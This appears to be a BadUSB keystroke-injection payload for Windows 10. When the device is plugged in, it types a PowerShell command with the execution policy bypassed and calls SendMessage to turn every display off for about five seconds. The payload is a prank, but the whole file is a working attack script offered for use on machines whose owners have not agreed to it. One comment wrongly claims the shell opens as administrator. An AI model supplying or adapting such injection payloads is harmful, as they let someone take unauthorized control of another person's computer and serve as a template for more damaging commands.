// =============================================================================
// Title: 5 Second Screen Kill
// Author: @beigeworm | https://github.com/beigeworm
// Description: Killss all displays for around 5 seconds.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("ENTER");
delay(4000);

// Main Powershell code
type("(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage (int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2);sleep 5;exit");
press("ENTER");
delay(500);
